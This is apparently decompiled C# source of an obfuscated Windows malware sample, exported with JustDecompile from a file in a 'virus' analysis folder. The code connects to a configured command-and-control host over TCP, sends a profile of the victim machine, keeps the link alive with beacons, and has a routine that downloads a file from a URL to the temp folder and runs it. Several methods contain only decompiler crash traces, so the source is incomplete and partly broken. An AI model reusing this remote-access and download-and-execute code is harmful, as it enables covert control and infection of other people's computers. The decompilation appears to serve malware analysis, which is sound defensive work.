using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

[StandardModule]
public sealed class ______________________________________________________________
{
	public static Thread _;

	public static TcpClient __;

	public static StreamWriter ___;

	public static bool ____;

	public static StreamReader _____;

	private static ______________________________________________________________._______________________________________________________________ ______;

	public static bool _______;

	public static bool ________;

	private static bool _________;

	public static bool __________;

	private static int ___________;

	private static FileStream ____________;

	public static string _____________;

	public static int ______________;

	public static string _______________;

	public static string ________________;

	public static string _________________;

	public static string __________________;

	public static string ___________________;

	public static string ____________________;

	public static string[] _____________________;

	public static bool ______________________;

	public static string _______________________;

	public static string ________________________;

	public static bool _________________________;

	public static Mutex __________________________;

	public static bool ___________________________;

	public static bool ____________________________;

	static ______________________________________________________________()
	{
		int num = 0;
		int num1;
		______________________________________________________________._ = new Thread(new ThreadStart(______________________________________________________________._________));
		______________________________________________________________.____ = false;
		int num2 = -18910;
		switch (sizeof(ulong))
		{
			case 8:
			{
				while (true)
				{
					______________________________________________________________._______ = false;
					______________________________________________________________.________ = false;
					______________________________________________________________._________ = false;
					______________________________________________________________.__________ = false;
					if (num2 == -18910)
					{
						break;
					}
				}
				______________________________________________________________.___________ = 0;
				int length = Type.EmptyTypes.Length + 10054;
				int ______ = <Module>.___________;
				int _________ = <Module>.________________;
				if ((______ + 385 * _________ + ______ * 3 + _________ * 127 & 1) == 0)
				{
					num = checked((int)250);
					num1 = num;
				}
				else
				{
					num1 = ((14 * (num / 262144) + 2 * (num / 262144) ^ 16781985) != 0 ? Type.EmptyTypes.Length + -1670853533 : Type.EmptyTypes.Length + 2028017545);
				}
				______________________________________________________________._______________ = <Module>.__________(length, 11783, num1);
				______________________________________________________________.______________________ = false;
				______________________________________________________________._______________________ = <Module>.______<string>(-1236445576);
				______________________________________________________________.________________________ = <Module>._______<string>(2127844380);
				______________________________________________________________._________________________ = false;
				______________________________________________________________.___________________________ = false;
				______________________________________________________________.____________________________ = false;
				return;
			}
			default:
			{
				goto case 8;
			}
		}
	}

	[STAThread]
	public static void ___()
	{
		try
		{
			string str = ___________________________________________________________________._(__________________________________________________________________________._____.Trim(), <Module>.____<string>(668638760));
			str = str.Trim();
			______________________________________________________________._____________________ = Strings.Split(str, <Module>._______<string>(1023697363), -1, CompareMethod.Binary);
			object length = sizeof(uint) + -2;
			while (true)
			{
				switch (length)
				{
					case 0:
					{
						______________________________________________________________._______________ = ______________________________________________________________._____________________[2];
						______________________________________________________________.________________ = ______________________________________________________________._____________________[3];
						length = sizeof(short) + -1;
						continue;
					}
					case 1:
					{
						break;
					}
					case 2:
					{
						______________________________________________________________._____________ = ______________________________________________________________._____________________[0];
						______________________________________________________________.______________ = Convert.ToInt32(______________________________________________________________._____________________[1]);
						length = Type.EmptyTypes.Length + 0;
						continue;
					}
					default:
					{
						goto case 2;
					}
				}
			}
			______________________________________________________________._________________ = ______________________________________________________________._____________________[4];
			______________________________________________________________.__________________ = ______________________________________________________________._____________________[5];
			______________________________________________________________.___________________ = ______________________________________________________________._____________________[6];
			______________________________________________________________.____________________ = ______________________________________________________________._____________________[7];
			if (!______________________________________________________________.___________________.Contains(<Module>._____<string>(585574209)))
			{
				______________________________________________________________.___________________________ = true;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			Thread.Sleep(-1);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (______________________________________________________________.___________________.Contains(<Module>.___<string>(-1354821262)) && ___________________________________________________________________.______())
			{
				______________________________________________________________._____();
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			ProjectData.ClearProjectError();
		}
		try
		{
			_____________________________________________________________________________.__ = Application.ExecutablePath;
			__________________________________________________________________._();
			______________________.__();
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(______________________________________________________________._________________, <Module>._______<string>(1177340789), false) != 0)
		{
			_____________________________________________________________________________.________();
		}
		if (______________________________________________________________.____(______________________________________________________________.__________________))
		{
			ProjectData.EndApp();
		}
		______________________________________________________________.______();
	}

	public static bool ____(string string_0)
	{
		bool flag;
		try
		{
			______________________________________________________________.__________________________ = new Mutex(false, string.Concat(<Module>.______<string>(-958142625), string_0));
			switch (Type.EmptyTypes.Length)
			{
				default:
				{
					if (______________________________________________________________.__________________________.WaitOne(0, false))
					{
						break;
					}
					else
					{
						______________________________________________________________.__________________________.Close();
						______________________________________________________________.__________________________ = null;
						flag = true;
						return flag;
					}
				}
			}
			______________________________________________________________.______________________ = true;
			flag = false;
		}
		catch (UnauthorizedAccessException unauthorizedAccessException)
		{
			ProjectData.SetProjectError(unauthorizedAccessException);
			flag = true;
			ProjectData.ClearProjectError();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			flag = false;
			ProjectData.ClearProjectError();
		}
		return flag;
	}

	public static void _____()
	{
		// 
		// Current member / type: System.Void ______________________________________________________________::_____()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _____()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ______()
	{
		// 
		// Current member / type: System.Void ______________________________________________________________::______()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ______()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void _______()
	{
		// 
		// Current member / type: System.Void ______________________________________________________________::_______()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _______()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ________()
	{
		// 
		// Current member / type: System.Void ______________________________________________________________::________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void _________()
	{
		int num = 0;
		while (true)
		{
			try
			{
				do
				{
					______________________________________________________________.__ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
					if (!______________________________________________________________._________)
					{
						______________________________________________________________._________ = true;
						switch (Type.EmptyTypes.Length)
						{
							default:
							{
								______________________________________________________________.__.ReceiveTimeout = 120000;
								______________________________________________________________.__.SendTimeout = 120000;
								break;
							}
						}
					}
					______________________________________________________________.___________(string.Format(string.Concat(<Module>.___<string>(500408849), ______________________________________________________________.___________________()), new object[0]));
				}
				while ((-877461504 & num) != (num & -877461504));
				______________________________________________________________._________________________ = true;
				if (!______________________________________________________________._______)
				{
					______________________________________________________________._______ = true;
					(new Thread(new ThreadStart(______________________________________________________________._______________))).Start();
				}
				if (!______________________________________________________________.________)
				{
					______________________________________________________________.________ = true;
					______________________________________________________________._ += new ______________________________________________________________._______________________________________________________________(______________________________________________________________._____________________);
				}
				NetworkStream stream = ______________________________________________________________.__.GetStream();
				byte[] numArray = new byte[] { 0 };
				stream.BeginRead(numArray, 0, 0, new AsyncCallback(______________________________________________________________.________________), null);
				break;
			}
			catch (Exception exception1)
			{
				ProjectData.SetProjectError(exception1);
				try
				{
					if (Operators.CompareString(______________________________________________________________._______________, <Module>._____<string>(-577222963), false) != 0)
					{
						if (Operators.CompareString(______________________________________________________________._____________, ______________________________________________________________._____________________[0], false) != 0)
						{
							______________________________________________________________._____________ = ______________________________________________________________._____________________[0];
						}
						else
						{
							______________________________________________________________._____________ = ______________________________________________________________._______________;
						}
					}
					______________________________________________________________.__.Close();
					______________________________________________________________._________________________ = false;
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(12000);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void __________(string string_0)
	{
		try
		{
			______________________________________________________________.___ = new StreamWriter(______________________________________________________________.__.GetStream());
			______________________________________________________________.___.WriteLine(string_0);
			______________________________________________________________.___.Flush();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			if (______________________________________________________________.__.Connected)
			{
				______________________________________________________________.___ = new StreamWriter(______________________________________________________________.__.GetStream());
				______________________________________________________________.___.WriteLine(string.Concat(<Module>.______<string>(1712386938), ___________________________________________________________________.__(string_0)));
				______________________________________________________________.___.Flush();
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________(string string_0)
	{
		try
		{
			______________________________________________________________.___________(string.Concat(<Module>.___<string>(-1999937940), string_0));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____________(string string_0)
	{
		try
		{
			______________________________________________________________.___ = new StreamWriter(______________________________________________________________.__.GetStream());
			______________________________________________________________.___.WriteLine(string.Concat(<Module>.___<string>(53750159), string_0));
			______________________________________________________________.___.Flush();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ______________(string string_0, string string_1)
	{
		int num = 0;
		string[] string0 = null;
		try
		{
			if (__________________________________________________________________.____(<Module>.___<string>(-2134431526)).Contains(<Module>.___<string>(-2080057863)))
			{
				object length = sizeof(ulong) + -8;
				while (true)
				{
					switch (length)
					{
						case 0:
						{
							string0 = new string[] { <Module>._____<string>(-992521140), null, null, null, null, null, null };
							num = (int)(sizeof(long) + -15906);
							length = Type.EmptyTypes.Length + 1;
							continue;
						}
						case 1:
						{
							break;
						}
						default:
						{
							goto case 0;
						}
					}
				}
				string0[1] = string_0;
				string0[2] = <Module>.______<string>(861631917);
				num == -15898;
				string0[3] = ______________________________________________________________.________________________;
				string0[4] = <Module>._____<string>(1052623516);
				string0[5] = string_1;
				string0[6] = <Module>.___<string>(-1617572493);
				______________________________________________________________.___________(string.Concat(string0));
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void _______________()
	{
		while (true)
		{
			try
			{
				______________________________________________________________.___________(<Module>.______<string>(-2114834431));
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(60000);
		}
	}

	public static void ________________(IAsyncResult iasyncResult_0)
	{
		try
		{
			______________________________________________________________._____ = new StreamReader(______________________________________________________________.__.GetStream());
			______________________________________________________________._______________________________________________________________ ____ = ______________________________________________________________.______;
			if (____ != null)
			{
				____(___________________________________________________________________.___(______________________________________________________________._____.ReadLine()));
			}
			NetworkStream stream = ______________________________________________________________.__.GetStream();
			byte[] numArray = new byte[] { 0 };
			stream.BeginRead(numArray, 0, 0, new AsyncCallback(______________________________________________________________.________________), null);
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			while (______________________________________________________________.____________________________)
			{
				Thread.Sleep(1000);
			}
			______________________________________________________________._________________________ = false;
			Thread.Sleep(12000);
			try
			{
				______________________________________________________________.__.Close();
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				ProjectData.ClearProjectError();
			}
			______________________________________________________________._________();
			ProjectData.ClearProjectError();
		}
	}

	public static void _________________(string string_0, string string_1, int int_0, int int_1)
	{
		try
		{
			_____________________________________ ___________________ = new _____________________________________()
			{
				__ = string_0,
				___ = string_1,
				____ = int_0,
				_____ = int_1
			};
			_____________________________________ ___________________1 = ___________________;
			(new Thread(new ThreadStart(___________________1.________))).Start();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void __________________(string string_0, string string_1, bool bool_0)
	{
		string str = null;
		try
		{
			if (-15688 == sizeof(double) + -15696)
			{
				WebClient webClient = new WebClient();
				str = string.Concat(Path.GetTempPath(), string_1);
				if (File.Exists(str))
				{
					______________________________________________________________.______________(<Module>._____<string>(1464211711), string.Concat(<Module>.______<string>(30716926), string_1));
					return;
				}
				else
				{
					switch (Type.EmptyTypes.Length)
					{
						case -1:
						{
							break;
						}
						default:
						{
							webClient.DownloadData(string_0);
							webClient.DownloadFile(string_0, str);
							break;
						}
					}
				}
			}
			Process.Start(str);
			if (!bool_0)
			{
				______________________________________________________________.______________(<Module>._______<string>(-1573320945), string.Concat(<Module>._______<string>(-1451741515), str));
			}
			else
			{
				______________________________________________________________.______________(<Module>.______<string>(2043928306), string.Concat(<Module>._____<string>(-1573919726), str));
				_____________________________________________________________________________.____________();
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>._______<string>(-1937358506), string.Concat(<Module>.____<string>(-1699493186), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static string ___________________()
	{
		string str = null;
		string str1;
		string str2;
		string oSFullName;
		int processorCount = 0;
		int num = 0;
		int ________ = 0;
		int num1 = 0;
		int num2;
		int length;
		int length1;
		try
		{
			str1 = string.Concat(______________________________________________________________.________________________, <Module>.______<string>(861631917));
			str1 = string.Concat(str1, <Module>.______<string>(1309731734));
			try
			{
				str1 = string.Concat(str1, <Module>.______<string>(-1664770003));
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				str1 = string.Concat(str1, <Module>.______<string>(-1664770003));
				ProjectData.ClearProjectError();
			}
			str2 = <Module>._____<string>(-1217698334);
			try
			{
				str2 = (!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(<Module>.____<string>(836847038)) ? <Module>.___<string>(-547386091) : <Module>.___<string>(158340191));
			}
			catch (Exception exception1)
			{
				ProjectData.SetProjectError(exception1);
				str2 = <Module>._____<string>(-1217698334);
				ProjectData.ClearProjectError();
			}
			try
			{
				string name = _____________._.Name;
				str1 = (Operators.CompareString(name, string.Empty, false) == 0 ? string.Concat(str1, <Module>.___<string>(-607995695)) : string.Concat(str1, <Module>.___<string>(-1617572493), name, <Module>.__________(((processorCount % 32768 & 1813544960) == 0 ? 45417 : Type.EmptyTypes.Length + 1580339735), 47121, Type.EmptyTypes.Length + 197)));
			}
			catch (Exception exception2)
			{
				ProjectData.SetProjectError(exception2);
				str1 = string.Concat(str1, <Module>.______<string>(322836794));
				ProjectData.ClearProjectError();
			}
			try
			{
				if (~(2077372460 | num1 * 2 + 2 * num1) == num1 + num1 * 3 - 5616)
				{
				}
				while (true)
				{
					oSFullName = _____________._.Info.OSFullName;
					if (!oSFullName.Contains(<Module>.___<string>(-1313721977)))
					{
						break;
					}
					if ((43 * num + num * 21 + 4904 | -34) == -2)
					{
						str1 = string.Concat(str1, <Module>.____<string>(774338714), str2);
						break;
					}
				}
				if (!oSFullName.Contains(<Module>.______<string>(628773579)))
				{
					goto Label0;
				}
				length1 = Type.EmptyTypes.Length + 1;
			Label4:
				switch (length1)
				{
					case 0:
					{
						str1 = string.Concat(str1, <Module>.___<string>(662727342), str2);
						goto Label1;
					}
					case 2:
					{
						str1 = string.Concat(str1, <Module>._____<string>(321630822), str2);
						goto Label2;
					}
				}
			Label7:
				str1 = string.Concat(str1, <Module>._______<string>(484667940), str2);
			Label0:
				if (!oSFullName.Contains(<Module>._______<string>(539440488)))
				{
					goto Label1;
				}
				if ((________ + 3 * ________ + 3 * ________ + ________ & 1399282432) != (________ * 8 & 1399282432))
				{
					goto Label7;
				}
				length1 = Type.EmptyTypes.Length + 0;
				goto Label4;
			}
			catch (Exception exception3)
			{
				ProjectData.SetProjectError(exception3);
				str1 = string.Concat(str1, <Module>.____<string>(-887426837), str2);
				ProjectData.ClearProjectError();
			}
		Label6:
			try
			{
				str1 = (!___________________________________________________________________.________() ? string.Concat(str1, <Module>.____<string>(-121011860)) : string.Concat(str1, <Module>._____<string>(1240795199)));
			}
			catch (Exception exception4)
			{
				ProjectData.SetProjectError(exception4);
				<Module>._________________ = -1592258590;
				str1 = string.Concat(str1, <Module>._______<string>(1380398983));
				ProjectData.ClearProjectError();
			}
			try
			{
				processorCount = Environment.ProcessorCount;
				string str3 = str1;
				num2 = ((4 * processorCount + processorCount * 124 - 7669 >> 7) - 113925046 != processorCount ? 12716 : 2038237625);
				if ((2 * processorCount - 3054 & 2) == (2 & (processorCount - 7471) * 2))
				{
					int _________ = <Module>._________________;
					if ((-1191182336 * _________ - 9217 & 2155) != 2155)
					{
						length = Type.EmptyTypes.Length + 1929082349;
					}
					else if (761 + (_________ << 28 >> 28) == -_________)
					{
						length = Type.EmptyTypes.Length + 1405938981;
					}
					else
					{
						________ = <Module>._______________;
						length = (1118 * ________ + 930 * ________ - -8445 != -6032 ? 14261 : 829267672);
					}
				}
				else
				{
					length = (int)(sizeof(long) + -1853901873);
				}
				str1 = string.Concat(str3, <Module>.__________(num2, length, ((processorCount * 2 + processorCount * 2 | -2) != -2 ? Type.EmptyTypes.Length + 883152264 : 18)), processorCount.ToString(), <Module>.____<string>(-1286171096));
			}
			catch (Exception exception5)
			{
				ProjectData.SetProjectError(exception5);
				str1 = string.Concat(str1, <Module>._______<string>(816641505));
				ProjectData.ClearProjectError();
			}
			try
			{
				str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(str1, <Module>.__________(3970, Type.EmptyTypes.Length + 5548, Type.EmptyTypes.Length + 178)), ___________________________________________________________________._________()), <Module>.____<string>(-1286171096)));
			}
			catch (Exception exception6)
			{
				ProjectData.SetProjectError(exception6);
				str1 = string.Concat(str1, <Module>._____<string>(-1084799145));
				ProjectData.ClearProjectError();
			}
			str = str1;
		}
		catch (Exception exception7)
		{
			ProjectData.SetProjectError(exception7);
			ProjectData.ClearProjectError();
		}
		return str;
